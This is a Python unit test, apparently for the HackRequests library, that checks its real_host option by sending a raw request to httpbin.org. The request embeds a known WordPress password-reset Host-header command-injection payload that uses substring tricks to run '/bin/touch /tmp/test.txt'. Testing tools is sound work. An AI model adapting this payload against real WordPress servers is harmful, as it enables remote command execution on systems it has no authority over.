#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/3/9 2:22 PM
# @Author  : w8ay
# @File    : test_real_host.py
import unittest
import HackRequests


class TestCase(unittest.TestCase):
    def setUp(self):
        self.hack = HackRequests.hackRequests()

    def test_real_ip(self):
        raw = '''
POST / HTTP/1.1
Host: aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://172.16.176.128:8000/wp-login.php?action=lostpassword
Cookie: wordpress_test_cookie=WP+Cookie+check
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

user_login=admin&redirect_to=&wp-submit=Get+New+Password
        '''
        r = self.hack.httpraw(raw, real_host="httpbin.org")
        self.assertTrue("405" in r.text())
